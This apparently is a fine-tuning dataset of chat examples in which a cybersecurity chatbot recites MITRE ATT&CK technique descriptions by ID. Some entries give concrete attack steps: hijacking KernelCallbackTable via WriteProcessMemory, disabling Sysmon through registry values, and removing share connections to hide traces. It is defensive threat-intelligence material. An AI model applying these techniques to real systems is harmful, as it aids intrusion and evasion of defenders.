{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'KernelCallbackTable' and with the Id: T1574.013 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'KernelCallbackTable' and with the Id: T1574.013 is described as follows: Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.(Citation: Windows Process Injection KernelCallbackTable)An adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.A pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT January 2022)The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Search Closed Sources' and with the Id: T1597 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Search Closed Sources' and with the Id: T1597 is described as follows: Adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data.(Citation: D3Secutrity CTI Feeds) Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.(Citation: ZDNET Selling Data)Adversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Systemd Timers' and with the Id: T1053.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Systemd Timers' and with the Id: T1053.006 is described as follows: Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: Systemd Remote Control)Each <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.(Citation: Falcon Sandbox smp: 28553b3a9d). The systems targeted by this attack pattern are: Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Phishing' and with the Id: T1566 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Phishing' and with the Id: T1566 is described as follows: Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) Victims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth). The systems targeted by this attack pattern are: Linux, macOS, Windows, SaaS, Office 365, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Graphical User Interface' and with the Id: T1061 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Graphical User Interface' and with the Id: T1061 is described as follows: **This technique has been deprecated. Please use [Remote Services](https://attack.mitre.org/techniques/T1021) where appropriate.**The Graphical User Interfaces (GUI) is a common way to interact with an operating system. Adversaries may use a system's GUI during an operation, commonly through a remote interactive session such as [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076), instead of through a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), to search for information and execute files via mouse double-click events, the Windows Run command (Citation: Wikipedia Run Command), or other potentially difficult to monitor interactions.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'ROMMONkit' and with the Id: T1542.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'ROMMONkit' and with the Id: T1542.004 is described as follows: Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation: Cisco Blog Legacy Device Attacks)ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.. The systems targeted by this attack pattern are: Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Compiled HTML File' and with the Id: T1218.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Compiled HTML File' and with the Id: T1218.001 is described as follows: Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Share Connection Removal' and with the Id: T1070.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Share Connection Removal' and with the Id: T1070.005 is described as follows: Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command. (Citation: Technet Net Use). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Multi-hop Proxy' and with the Id: T1090.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Multi-hop Proxy' and with the Id: T1090.003 is described as follows: Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.For example, adversaries may construct or use onion routing networks \u2013 such as the publicly available [Tor](https://attack.mitre.org/software/S0183) network \u2013 to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network.(Citation: Onion Routing)In the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., [Network Devices](https://attack.mitre.org/techniques/T1584/008)). By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001) on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization\u2019s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.Similarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.(Citation: NGLite Trojan). The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Brute Force' and with the Id: T1110 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Brute Force' and with the Id: T1110 is described as follows: Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.(Citation: TrendMicro Pawn Storm Dec 2020) Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism.(Citation: Dragos Crashoverride 2018) Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.. The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace, Containers, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Unix Shell' and with the Id: T1059.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Unix Shell' and with the Id: T1059.004 is described as follows: Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.. The systems targeted by this attack pattern are: macOS, Linux, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Outlook Forms' and with the Id: T1137.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Outlook Forms' and with the Id: T1137.003 is described as follows: Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)Once malicious forms have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SensePost Outlook Forms). The systems targeted by this attack pattern are: Windows, Office 365 ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Dylib Hijacking' and with the Id: T1157 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Dylib Hijacking' and with the Id: T1157 is described as follows: macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence.A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. (Citation: Writing Bad Malware for OSX) (Citation: Malware Persistence on OS X)If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level. This can be used by adversaries as a privilege escalation technique.. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Disable or Modify Tools' and with the Id: T1562.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Disable or Modify Tools' and with the Id: T1562.001 is described as follows: Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Adversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) On network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware). The systems targeted by this attack pattern are: Windows, macOS, Linux, Containers, IaaS, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data Manipulation' and with the Id: T1565 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data Manipulation' and with the Id: T1565 is described as follows: Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: Sygnia Elephant Beetle Jan 2022) By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Inter-Process Communication' and with the Id: T1559 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Inter-Process Communication' and with the Id: T1559 is described as follows: Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) or [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Linux environments support several different IPC mechanisms, two of which being sockets and pipes.(Citation: Linux IPC) Higher level execution mediums, such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, may also leverage underlying IPC mechanisms. Adversaries may also use [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) to facilitate remote IPC execution.(Citation: Fireeye Hunting COM June 2019). The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data Obfuscation' and with the Id: T1001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data Obfuscation' and with the Id: T1001 is described as follows: Adversaries may obfuscate command and control traffic to make it more difficult to detect.(Citation: Bitdefender FunnyDream Campaign November 2020) Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols. . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data from Network Shared Drive' and with the Id: T1039 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data from Network Shared Drive' and with the Id: T1039 is described as follows: Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Web Services' and with the Id: T1584.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Web Services' and with the Id: T1584.006 is described as follows: Adversaries may compromise access to third-party web services\u00a0that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Recorded Future Turla Infra 2020) Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Modify System Image' and with the Id: T1601 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Modify System Image' and with the Id: T1601 is described as follows: Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.. The systems targeted by this attack pattern are: Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hijack Execution Flow' and with the Id: T1574 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hijack Execution Flow' and with the Id: T1574 is described as follows: Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Indicator Removal from Tools' and with the Id: T1027.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Indicator Removal from Tools' and with the Id: T1027.005 is described as follows: Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Malicious Image' and with the Id: T1204.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Malicious Image' and with the Id: T1204.003 is described as follows: Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs)Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021). The systems targeted by this attack pattern are: IaaS, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Container Service' and with the Id: T1543.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Container Service' and with the Id: T1543.005 is described as follows: Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.For example, by using the `docker run` or `podman run` command with the `restart=always` directive, a container can be configured to persistently restart on the host.(Citation: AquaSec TeamTNT 2023) A user with access to the (rootful) docker command may also be able to escalate their privileges on the host.(Citation: GTFOBins Docker)In Kubernetes environments, DaemonSets allow an adversary to persistently [Deploy Container](https://attack.mitre.org/techniques/T1610)s on all nodes, including ones added later to the cluster.(Citation: Aquasec Kubernetes Attack 2023)(Citation: Kubernetes DaemonSet) Pods can also be deployed to specific nodes using the `nodeSelector` or `nodeName` fields in the pod spec.(Citation: Kubernetes Assigning Pods to Nodes)(Citation: AppSecco Kubernetes Namespace Breakout 2020)Note that containers can also be configured to run as [Systemd Service](https://attack.mitre.org/techniques/T1543/002)s.(Citation: Podman Systemd)(Citation: Docker Systemd). The systems targeted by this attack pattern are: Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Valid Accounts' and with the Id: T1078 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Valid Accounts' and with the Id: T1078 is described as follows: Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft). The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace, Containers, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Non-Standard Port' and with the Id: T1571 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Non-Standard Port' and with the Id: T1571 is described as follows: Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.(Citation: change_rdp_port_conti). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Social Media Accounts' and with the Id: T1585.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Social Media Accounts' and with the Id: T1585.001 is described as follows: Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)For operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. Once a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).. The systems targeted by this attack pattern are: PRE ."}]}
